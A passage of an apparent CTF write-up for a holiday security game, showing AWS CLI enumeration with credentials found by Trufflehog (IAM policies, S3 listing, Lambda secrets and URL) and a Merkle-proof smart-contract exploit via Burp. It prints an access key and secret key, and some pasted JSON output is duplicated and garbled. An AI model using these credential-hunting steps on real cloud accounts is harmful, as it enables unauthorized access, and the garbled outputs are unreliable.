+    PolicyDocument='{&quot;Version&quot;:&quot;2012-10-17&quot;,&quot;Statement&quot;:[{&quot;Effect&quot;:&quot;Allow&quot;,&quot;Action&quot;:[&quot;ssm:SendCommand&quot;],&quot;Resource&quot;:[&quot;arn:aws:ec2:us-east-1:748127089694:instance/i-0415bfb7dcfe279c5&quot;,&quot;arn:aws:ec2:us-east-1:748127089694:document/RestartServices&quot;]}]}',
+    PolicyName='AllAccessPolicy',
+    UserName='nwt8_test',
+)
+</code></pre>
+<p>5.- Quick config aws-cli</p>
+<pre><code class="language-ruby">elf@ef250a6290e8:~/aws_scripts$ aws configure
+AWS Access Key ID [None]: AKIAAIDAYRANYAHGQOHD
+AWS Secret Access Key [None]: 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
+Default region name [None]: us-east-1
+Default output format [None]: json
+elf@ef250a6290e8:~/aws_scripts$ 
+</code></pre>
+<p>6.- Use Trufflehog to find credentials in the Gitlab instance at https://haugfactory.com/asnowball/aws_scripts.git.
+Configure these credentials for us-east-1 and then run:</p>
+<pre><code class="language-ruby">elf@ef250a6290e8:~/aws_scripts$ aws sts get-caller-identity &lt;- OK 
+{
+    &quot;UserId&quot;: &quot;AIDAJNIAAQYHIAAHDDRA&quot;,
+    &quot;Account&quot;: &quot;602123424321&quot;,
+    &quot;Arn&quot;: &quot;arn:aws:iam::602123424321:user/haug&quot;
+}
+</code></pre>
+<p>7.- Managed (think: shared) policies can be attached to multiple users. Use the AWS CLI to find any policies attached to your user.
+The aws iam command to list attached user policies can be found here:
+https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html
+Hint: it is NOT list-user-policies.</p>
+<pre><code class="language-ruby">elf@ef250a6290e8:~/aws_scripts$ aws iam list-attached-user-policies --user-name haug &lt;-OK 
+{
+    &quot;AttachedPolicies&quot;: [
+        {
+            &quot;PolicyName&quot;: &quot;TIER1_READONLY_POLICY&quot;,
+            &quot;PolicyArn&quot;: &quot;arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY&quot;
+        }
+    ],
+    &quot;IsTruncated&quot;: false
+}
+elf@ef250a6290e8:~/aws_scripts$
+</code></pre>
+<p>8.- Now, view or get the policy that is attached to your user.
+The aws iam command to get a policy can be found here:
+https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.htm</p>
+<pre><code class="language-ruby">elf@ef250a6290e8:~/aws_scripts$ aws iam get-policy --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY &lt;-OK 
+{
+    &quot;Policy&quot;: {
+        &quot;PolicyName&quot;: &quot;TIER1_READONLY_POLICY&quot;,
+        &quot;PolicyId&quot;: &quot;ANPAYYOROBUERT7TGKUHA&quot;,
+        &quot;Arn&quot;: &quot;arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY&quot;,
+        &quot;Path&quot;: &quot;/&quot;,
+        &quot;DefaultVersionId&quot;: &quot;v1&quot;,
+        &quot;AttachmentCount&quot;: 11,
+        &quot;PermissionsBoundaryUsageCount&quot;: 0,
+        &quot;IsAttachable&quot;: true,
+        &quot;Description&quot;: &quot;Policy for tier 1 accounts to have limited read only access to certain resources in IAM, S3, and LAMBDA.&quot;,
+        &quot;CreateDate&quot;: &quot;2022-06-21 22:02:30+00:00&quot;,
+        &quot;UpdateDate&quot;: &quot;2022-06-21 22:10:29+00:00&quot;,
+        &quot;Tags&quot;: []
+    }
+}
+elf@ef250a6290e8:~/aws_scripts$ 
+</code></pre>
+<p>9.- Attached policies can have multiple versions. View the default version of this policy.
+The aws iam command to get a policy version can be found here:
+https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html</p>
+<pre><code class="language-ruby">$ aws iam get-policy-version --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY --version-id v1  &lt;-OK 
+
+{
+    &quot;PolicyVersion&quot;: {
+        &quot;Document&quot;: {
+            &quot;Version&quot;: &quot;2012-10-17&quot;,
+            &quot;Statement&quot;: [
+                {
+                    &quot;Effect&quot;: &quot;Allow&quot;,
+                    &quot;Action&quot;: [
+                        &quot;lambda:ListFunctions&quot;,
+                        &quot;lambda:GetFunctionUrlConfig&quot;
+                    ],
+                    &quot;Resource&quot;: &quot;*&quot;
+                },
+                {
+                    &quot;Effect&quot;: &quot;Allow&quot;,
+                    &quot;Action&quot;: [
+                        &quot;iam:GetUserPolicy&quot;,
+                        &quot;iam:ListUserPolicies&quot;,
+                        &quot;iam:ListAttachedUserPolicies&quot;
+                    ],
+                    &quot;Resource&quot;: &quot;arn:aws:iam::602123424321:user/${aws:username}&quot;
+                },
+                {
+                    &quot;Effect&quot;: &quot;Allow&quot;,
+                    &quot;Action&quot;: [
+                        &quot;iam:GetPolicy&quot;,
+                        &quot;iam:GetPolicyVersion&quot;
+                    ],
+                    &quot;Resource&quot;: &quot;arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY&quot;
+                },
+                {
+                    &quot;Effect&quot;: &quot;Deny&quot;,
+                    &quot;Principal&quot;: &quot;*&quot;,
+                    &quot;Action&quot;: [
+                        &quot;s3:GetObject&quot;,
+                        &quot;lambda:Invoke*&quot;
+                    ],
+                    &quot;Resource&quot;: &quot;*&quot;
+                }
+                    &quot;Action&quot;: [
+                        &quot;lambda:ListFunctions&quot;,
+                        &quot;lambda:GetFunctionUrlConfig&quot;
+                    ],
+                    &quot;Resource&quot;: &quot;*&quot;
+                },
+                {
+                    &quot;Effect&quot;: &quot;Allow&quot;,
+                    &quot;Action&quot;: [
+                        &quot;iam:GetUserPolicy&quot;,
+                        &quot;iam:ListUserPolicies&quot;,
+                        &quot;iam:ListAttachedUserPolicies&quot;
+                    ],
+                    &quot;Resource&quot;: &quot;arn:aws:iam::602123424321:user/${aws:username}&quot;
+                },
+                {
+                    &quot;Effect&quot;: &quot;Allow&quot;,
+                    &quot;Action&quot;: [
+                        &quot;iam:GetPolicy&quot;,
+                        &quot;iam:GetPolicyVersion&quot;
+                    ],
+                    &quot;Resource&quot;: &quot;arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY&quot;
+                },
+                {
+                    &quot;Effect&quot;: &quot;Deny&quot;,
+                    &quot;Principal&quot;: &quot;*&quot;,
+                    &quot;Action&quot;: [
+                        &quot;s3:GetObject&quot;,
+                        &quot;lambda:Invoke*&quot;
+                    ],
+                    &quot;Resource&quot;: &quot;*&quot;
+                }
+            ]
+        },
+        &quot;VersionId&quot;: &quot;v1&quot;,
+        &quot;IsDefaultVersion&quot;: false,
+        &quot;CreateDate&quot;: &quot;2022-06-21 22:02:30+00:00&quot;
+    }
+}
+</code></pre>
+<p>10.- Inline policies are policies that are unique to a particular identity or resource. Use the AWS CLI to list the inline policies associated with your user. 
+The aws iam command to list user policies can be found here:
+https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html
+Hint: it is NOT list-attached-user-policies.</p>
+<pre><code class="language-ruby">$ aws iam list-user-policies --user-name haug 
+{
+    &quot;PolicyNames&quot;: [
+        &quot;S3Perms&quot;
+    ],
+    &quot;IsTruncated&quot;: false
+}
+</code></pre>
+<p>11.- Now, use the AWS CLI to get the only inline policy for your user. 
+The aws iam command to get a user policy can be found here:
+https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html</p>
+<pre><code class="language-ruby">elf@ef250a6290e8:~/aws_scripts$ aws iam get-user-policy --user-name haug --policy-name S3Perms  &lt;-OK
+
+{
+    &quot;UserPolicy&quot;: {
+        &quot;UserName&quot;: &quot;haug&quot;,
+        &quot;PolicyName&quot;: &quot;S3Perms&quot;,
+        &quot;PolicyDocument&quot;: {
+            &quot;Version&quot;: &quot;2012-10-17&quot;,
+            &quot;Statement&quot;: [
+                {
+                    &quot;Effect&quot;: &quot;Allow&quot;,
+                    &quot;Action&quot;: [
+                        &quot;s3:ListObjects&quot;
+                    ],
+                    &quot;Resource&quot;: [
+                        &quot;arn:aws:s3:::smogmachines3&quot;,
+                        &quot;arn:aws:s3:::smogmachines3/*&quot;
+                    ]
+                }
+            ]
+        }
+    },
+    &quot;IsTruncated&quot;: false
+}
+elf@ef250a6290e8:~/aws_scripts$
+</code></pre>
+<p>12.- The inline user policy named S3Perms disclosed the name of an S3 bucket that you have permissions to list objects. 
+List those objects! 
+The aws s3api command to list objects in an s3 bucket can be found here:
+https://awscli.amazonaws.com/v2/documentation/api/latest/reference/s3api/index.html</p>
+<pre><code class="language-ruby">elf@ef250a6290e8:~/aws_scripts$ aws s3api list-objects --bucket smogmachines3 --query 'Contents[].{Key: Key, Size: Size}' &lt;--OK
+[
+    {
+        &quot;Key&quot;: &quot;coal-fired-power-station.jpg&quot;,
+        &quot;Size&quot;: 59312
+    },
+    {
+        &quot;Key&quot;: &quot;industry-smog.png&quot;,
+        &quot;Size&quot;: 272528
+    },
+    {
+        &quot;Key&quot;: &quot;pollution-smoke.jpg&quot;,
+        &quot;Size&quot;: 33064
+    },
+    {
+        &quot;Key&quot;: &quot;pollution.jpg&quot;,
+        &quot;Size&quot;: 81775
+    },
+    {
+        &quot;Key&quot;: &quot;power-station-smoke.jpg&quot;,
+        &quot;Size&quot;: 45264
+    },
+    {
+        &quot;Key&quot;: &quot;smog-power-station.jpg&quot;,
+        &quot;Size&quot;: 32498
+    },
+    {
+        &quot;Key&quot;: &quot;smogmachine_lambda_handler_qyJZcqvKOthRMgVrAJqq.py&quot;,
+        &quot;Size&quot;: 5823
+    }
+]
+elf@ef250a6290e8:~/aws_scripts$
+</code></pre>
+<p>13.- The attached user policy provided you several Lambda privileges. Use the AWS CLI to list Lambda functions.
+The aws lambda command to list functions can be found here:
+https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/index.html</p>
+<pre><code class="language-ruby">$ aws lambda list-functions | more &lt;- OK 
+
+{
+    &quot;Functions&quot;: [
+        {
+            &quot;FunctionName&quot;: &quot;smogmachine_lambda&quot;,
+            &quot;FunctionArn&quot;: &quot;arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lambda&quot;,
+            &quot;Runtime&quot;: &quot;python3.9&quot;,
+            &quot;Role&quot;: &quot;arn:aws:iam::602123424321:role/smogmachine_lambda&quot;,
+            &quot;Handler&quot;: &quot;handler.lambda_handler&quot;,
+            &quot;CodeSize&quot;: 2126,
+            &quot;Description&quot;: &quot;&quot;,
+            &quot;Timeout&quot;: 600,
+            &quot;MemorySize&quot;: 256,
+            &quot;LastModified&quot;: &quot;2022-09-07T19:28:23.634+0000&quot;,
+            &quot;CodeSha256&quot;: &quot;GFnsIZfgFNA1JZP3TgTI0tIavOpDLiYlg7oziWbtRsa=&quot;,
+            &quot;Version&quot;: &quot;$LATEST&quot;,
+            &quot;VpcConfig&quot;: {
+                &quot;SubnetIds&quot;: [
+                    &quot;subnet-8c80a9cb8b3fa5505&quot;
+                ],
+                &quot;SecurityGroupIds&quot;: [
+                    &quot;sg-b51a01f5b4711c95c&quot;
+                ],
+                &quot;VpcId&quot;: &quot;vpc-85ea8596648f35e00&quot;
+            },
+            &quot;Environment&quot;: {
+                &quot;Variables&quot;: {
+                    &quot;LAMBDASECRET&quot;: &quot;975ceab170d61c75&quot;,
+                    &quot;LOCALMNTPOINT&quot;: &quot;/mnt/smogmachine_files&quot;
+                }
+            },
+            &quot;TracingConfig&quot;: {
+                &quot;Mode&quot;: &quot;PassThrough&quot;
+            },
+            &quot;RevisionId&quot;: &quot;7e198c3c-d4ea-48dd-9370-e5238e9ce06e&quot;,
+            &quot;FileSystemConfigs&quot;: [
+                {
+                    &quot;Arn&quot;: &quot;arn:aws:elasticfilesystem:us-east-1:602123424321:access-point/fsap-
+db3277b03c6e975d2&quot;,
+                    &quot;LocalMountPath&quot;: &quot;/mnt/smogmachine_files&quot;
+
+            &quot;LastModified&quot;: &quot;2022-09-07T19:28:23.634+0000&quot;,
+            &quot;CodeSha256&quot;: &quot;GFnsIZfgFNA1JZP3TgTI0tIavOpDLiYlg7oziWbtRsa=&quot;,
+            &quot;Version&quot;: &quot;$LATEST&quot;,
+            &quot;VpcConfig&quot;: {
+                &quot;SubnetIds&quot;: [
+                    &quot;subnet-8c80a9cb8b3fa5505&quot;
+                ],
+                &quot;SecurityGroupIds&quot;: [
+                    &quot;sg-b51a01f5b4711c95c&quot;
+                ],
+                &quot;VpcId&quot;: &quot;vpc-85ea8596648f35e00&quot;
+            },
+            &quot;Environment&quot;: {
+                &quot;Variables&quot;: {
+                    &quot;LAMBDASECRET&quot;: &quot;975ceab170d61c75&quot;,
+                    &quot;LOCALMNTPOINT&quot;: &quot;/mnt/smogmachine_files&quot;
+                }
+            },
+            &quot;TracingConfig&quot;: {
+                &quot;Mode&quot;: &quot;PassThrough&quot;
+            },
+            &quot;RevisionId&quot;: &quot;7e198c3c-d4ea-48dd-9370-e5238e9ce06e&quot;,
+            &quot;FileSystemConfigs&quot;: [
+                {
+                    &quot;Arn&quot;: &quot;arn:aws:elasticfilesystem:us-east-1:602123424321:access-point/fsap-
+db3277b03c6e975d2&quot;,
+                    &quot;LocalMountPath&quot;: &quot;/mnt/smogmachine_files&quot;
+                }
+            ],
+            &quot;PackageType&quot;: &quot;Zip&quot;,
+            &quot;Architectures&quot;: [
+                &quot;x86_64&quot;
+            ],
+            &quot;EphemeralStorage&quot;: {
+                &quot;Size&quot;: 512
+            }
+        }
+    ]
+}
+</code></pre>
+<p>14.- Lambda functions can have public URLs from which they are directly accessible.
+Use the AWS CLI to get the configuration containing the public URL of the Lambda function.
+The aws lambda command to get the function URL config can be found here:
+https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/index.html</p>
+<pre><code class="language-ruby">elf@ef250a6290e8:~/aws_scripts$ aws lambda  get-function-url-config --function-name smogmachine_lambda
+{
+    &quot;FunctionUrl&quot;: &quot;https://rxgnav37qmvqxtaksslw5vwwjm0suhwc.lambda-url.us-east-1.on.aws/&quot;,
+    &quot;FunctionArn&quot;: &quot;arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lambda&quot;,
+    &quot;AuthType&quot;: &quot;AWS_IAM&quot;,
+    &quot;Cors&quot;: {
+        &quot;AllowCredentials&quot;: false,
+        &quot;AllowHeaders&quot;: [],
+        &quot;AllowMethods&quot;: [
+            &quot;GET&quot;,
+            &quot;POST&quot;
+        ],
+        &quot;AllowOrigins&quot;: [
+            &quot;*&quot;
+        ],
+        &quot;ExposeHeaders&quot;: [],
+        &quot;MaxAge&quot;: 0
+    },
+    &quot;CreationTime&quot;: &quot;2022-09-07T19:28:23.808713Z&quot;,
+    &quot;LastModifiedTime&quot;: &quot;2022-09-07T19:28:23.808713Z&quot;
+}
+elf@ef250a6290e8:~/aws_scripts$ 
+
+Locate the arg FunctionName 
+
+$ aws lambda list-functions  | grep FunctionName 
+&quot;FunctionName&quot;: &quot;smogmachine_lambda&quot;,
+</code></pre>
+<p><img src="Objectives/img/4.5_Exploitation_via_AWS_CLI_solve.png"></p>
+<p><img src="Objectives/img/4.5_Exploitation_via_AWS_CLI_completed.png"></p></section><h1 class='nav-section-title-end'>Ended: 4. Recover the Cloud Ring</h1>
+                        <h1 class='nav-section-title' id='section-5-recover-the-burning-ring-of-fire'>
+                            5. Recover the Burning Ring of Fire <a class='headerlink' href='#section-5-recover-the-burning-ring-of-fire' title='Permanent link'>↵</a>
+                        </h1>
+                        <section class="print-page" id="objectives-5_recover_the_burning_ring_of_fire-5.1_buy_a_hat"><h1 id="objectives-5_recover_the_burning_ring_of_fire-5.1_buy_a_hat-recover-the-burning-ring-of-fire">Recover the Burning Ring of Fire</h1>
+<h2 id="objectives-5_recover_the_burning_ring_of_fire-5.1_buy_a_hat-51-buy-a-hat">5.1 Buy a Hat</h2>
+<p><img src="Objectives/img/5.1_Buy_a_Hat.png"></p>
+<p>Travel to the Burning Ring of Fire and purchase a hat from the vending machine with KringleCoin. Find hints for this objective hidden throughout the tunnels.</p>
+<h2 id="objectives-5_recover_the_burning_ring_of_fire-5.1_buy_a_hat-hints">Hint(s)</h2>
+<p><img src="Objectives/img/5.1_hint1.png"></p>
+<p><img src="Objectives/img/5.1_hint2.png"></p>
+<p><img src="Objectives/img/5.1_hint3.png"></p>
+<h2 id="objectives-5_recover_the_burning_ring_of_fire-5.1_buy_a_hat-solve">Solve</h2>
+<pre><code class="language-ruby">1. Find the vending machine on Destinations menu &quot;Burning Ring of Fire&quot;
+2. Remember to use the wallet ID that was created on challenge &quot;KringleCon Orientation 0.3 Create a wallet&quot;
+3. Do &quot;click&quot; on vending machine anc choose your hat &quot;View our Inventory&quot;, save the wallet address ID , Hat ID and the amount 10 KC (kringleCoins), close the window.
+4. See beside a KTM machine and do &quot;click&quot; on &quot;Approve a KringleCoin tranfer&quot;, fillout with the wallet address, umount and use your key created on &quot;KringleCon Orientation 0.3 Create a wallet&quot;.
+5. Do &quot;click&quot; Approve Transfer see the message &quot;Success approved&quot; , close the window.
+6. Back to vending machine and do &quot;click&quot; on section &quot;Approved a transaction? know your HatID? click here to buy&quot;
+7. Fillout with your wallet ID created on challenge &quot;KringleCon Orientation 0.3 Create a wallet&quot; and number of &quot;Hat ID&quot; saved on step 3.
+8. Do click on Make your purchase! see the message &quot;Transaction succeeed&quot; 
+9. Verify your new hat doing &quot;click&quot; on Hat icon
+</code></pre>
+<p><img src="Objectives/img/5.1_Buy_a_Hat_solve_1.png"></p>
+<p><img src="Objectives/img/5.1_Buy_a_Hat_solve_2.png"></p>
+<p><img src="Objectives/img/5.1_Buy_a_Hat_solve_3.png"></p>
+<p><img src="Objectives/img/5.1_Buy_a_Hat_completed.png"></p></section><section class="print-page" id="objectives-5_recover_the_burning_ring_of_fire-5.2_blockchain_divination"><h1 id="objectives-5_recover_the_burning_ring_of_fire-5.2_blockchain_divination-recover-the-burning-ring-of-fire">Recover the Burning Ring of Fire</h1>
+<h2 id="objectives-5_recover_the_burning_ring_of_fire-5.2_blockchain_divination-52-blockchain-divination">5.2 Blockchain Divination</h2>
+<p><img src="Objectives/img/5.2_Blockchain_Divination.png"></p>
+<p>Use the Blockchain Explorer in the Burning Ring of Fire to investigate the contracts and transactions on the chain. At what address is the KringleCoin smart contract deployed? Find hints for this objective hidden throughout the tunnels.</p>
+<h2 id="objectives-5_recover_the_burning_ring_of_fire-5.2_blockchain_divination-hints">Hint(s)</h2>
+<p><img src="Objectives/img/5.2_hint1.png"></p>
+<p><img src="Objectives/img/5.2_hint2.png"></p>
+<h2 id="objectives-5_recover_the_burning_ring_of_fire-5.2_blockchain_divination-solve">Solve</h2>
+<pre><code class="language-ruby">ANSWER: 0xc27A2D3DE339Ce353c0eFBa32e948a88F1C86554
+</code></pre>
+<p>Just see the transactions on green area TO:</p>
+<p><img src="Objectives/img/5.2_Blockchain_Divination_solve.png"></p>
+<p><img src="Objectives/img/5.2_Blockchain_Divination_completed.png"></p></section><section class="print-page" id="objectives-5_recover_the_burning_ring_of_fire-5.3_exploit_a_smart_contract"><h1 id="objectives-5_recover_the_burning_ring_of_fire-5.3_exploit_a_smart_contract-recover-the-burning-ring-of-fire">Recover the Burning Ring of Fire</h1>
+<h2 id="objectives-5_recover_the_burning_ring_of_fire-5.3_exploit_a_smart_contract-53-exploit-a-smart-contract">5.3 Exploit a Smart Contract</h2>
+<p><img src="Objectives/img/5.3_Exploit_a_Smart_Contract.png"></p>
+<p>Exploit flaws in a smart contract to buy yourself a Bored Sporc NFT. Find hints for this objective hidden throughout the tunnels.</p>
+<h2 id="objectives-5_recover_the_burning_ring_of_fire-5.3_exploit_a_smart_contract-hints">Hint(s)</h2>
+<p><img src="Objectives/img/5.3_hint1.png"></p>
+<h2 id="objectives-5_recover_the_burning_ring_of_fire-5.3_exploit_a_smart_contract-solve">Solve</h2>
+<pre><code class="language-ruby">
+ANSWER:
+WalletID: 0x40d9F41e7a951C301FD7eBCB31E6A96f6C61992e
+Root: 0x5a657105c493a1213c976c653e929218bb4a516bca307dce5861ec23fffa4e58
+Proof: 0x5a657105c493a1213c976c653e929218bb4a516bca307dce5861ec23fffa4e
+
+</code></pre>
+<h3 id="objectives-5_recover_the_burning_ring_of_fire-5.3_exploit_a_smart_contract-terminal-answers">Terminal answers</h3>
+<p>1.- See the source code of webapp and the arguments provided. 
+<img src="Objectives/img/5.3_Exploit_a_Smart_Contract_solve1.png"></p>
+<pre><code class="language-ruby">Arguments to Modify: 
+
+WalletID:
+Root: 
+Proof:
+</code></pre>
+<p>2.- Read a bit theory for best understanding regarding the "Merkle Trees". </p>
+<pre><code class="language-ruby">https://decentralizedthoughts.github.io/2020-12-22-what-is-a-merkle-tree/
+</code></pre>
+<p>3.- The big hint provided was through the talks "Professor Pentabyte", there is a docker with a python ready to be used. </p>
+<pre><code class="language-ruby">$ git clone https://github.com/QPetabyte/Merkle_Trees.git
+$ cd Merkle_Trees
+$ sudo docker build -t merkletrees .
+$ sudo docker run -it --rm --name=merkletrees merkletrees
+</code></pre>
+<p>4.- Once undertanding the "Merkle Trees", we can use the python code and create a basic tree with any number of "leaf" nodes.</br>
+5.- Read the chall in depth, we need  know our "proof" and our own "root" as well, based in our own Wallet ID. </br>
+6.- Observe in depth comments of python code a lot of hints, the important piece is the array with two "leaf" nodes.</br>
+7.- My first attemps was extract at least eight wallets ID valids (from some other players) and see what's happends if I put my walletID, suppose I am into same blockchain of players?</br>
+8.- Wrong!, python generated a valid proof and root but is not the correct way.</br>
+9.- Reading more in depth the code, after experiments some nites with a lot of theories, finally just we need a simple proof and root from my Walley ID , right? </br>
+10.- Modify the current array only with two "leaf" nodes, that's means add your walletID and a "null" value, that could be enought to know your proof and root from my WalletID</br></p>
+<p><img src="Objectives/img/5.3_Exploit_a_Smart_Contract_solve10.png"></p>
+<p>11.- Run again the python script with the new values generated:</p>
+<pre><code class="language-ruby">mt_user@a59aca8cc3d9:~$ python3 merkle_tree.py 
+Root: 0xd53bb3cb4648f394794570f7ce6d91b5f111fdc6806dffed36eacdea9e8d666a
+Proof: ['0x5a657105c493a1213c976c653e929218bb4a516bca307dce5861ec23fffa4e58']
+mt_user@a59aca8cc3d9:~$ 
+</code></pre>
+<p>12.- Now use burp to modify the arguments and send the correct data:  </p>
+<pre><code class="language-ruby">WalletID: 0x40d9F41e7a951C301FD7eBCB31E6A96f6C61992e
+Root: 0x5a657105c493a1213c976c653e929218bb4a516bca307dce5861ec23fffa4e58
+Proof: 0x5a657105c493a1213c976c653e929218bb4a516bca307dce5861ec23fffa4e
+</code></pre>
+<p><img src="Objectives/img/5.3_Exploit_a_Smart_Contract_solve11.png"> </p>
+<p>13.- Voila!, FLAG! see your new <strong>BoredSporc</strong> (avatar)</p>
+<p><img src="Objectives/img/5.3_Exploit_a_Smart_Contract_solve12.png"></p>
+<p><img src="Objectives/img/5.3_Exploit_a_Smart_Contract_solve13.png"></p>
+<p><img src="Objectives/img/5.3_Exploit_a_Smart_Contract_completed.png"></p></section><h1 class='nav-section-title-end'>Ended: 5. Recover the Burning Ring of Fire</h1>
+                        <h1 class='nav-section-title' id='section-6-finale'>
+                            6. Finale <a class='headerlink' href='#section-6-finale' title='Permanent link'>↵</a>
+                        </h1>
+                        <section class="print-page" id="objectives-6_finale-6.1_finale"><h1 id="objectives-6_finale-6.1_finale-finale">Finale</h1>
+<h1 id="objectives-6_finale-6.1_finale-61-finale-and-roll-credits">6.1 Finale and Roll Credits;</h1>
+<p>Back to talk with Santa from and castle's port now is open.</p>
+<p><img src="Objectives/img/6.1_Finale_santa.png"></p>
+<h2 id="objectives-6_finale-6.1_finale-castle-room">Castle Room:</h2>
+<p><img src="Objectives/img/6.1_Finalle_castle1.png"></p>
+<h2 id="objectives-6_finale-6.1_finale-roll-credits">Roll Credits:</h2>
+<p><img src="Objectives/img/6.1_Finalle_castle2.png"></p></section><h1 class='nav-section-title-end'>Ended: 6. Finale</h1></div>
+              
+            </div>
+          </div><footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+    
+  </span>
+</div>
+    <script>var base_url = '/';</script>
+    <script src="js/theme_extra.js" defer></script>
+    <script src="js/theme.js" defer></script>
+      <script src="js/print-site.js" defer></script>
+      <script src="https:/cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+      <script src="search/main.js" defer></script>
+    <script defer>
+        window.onload = function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        };
+    </script>
+
+</body>
+</html>
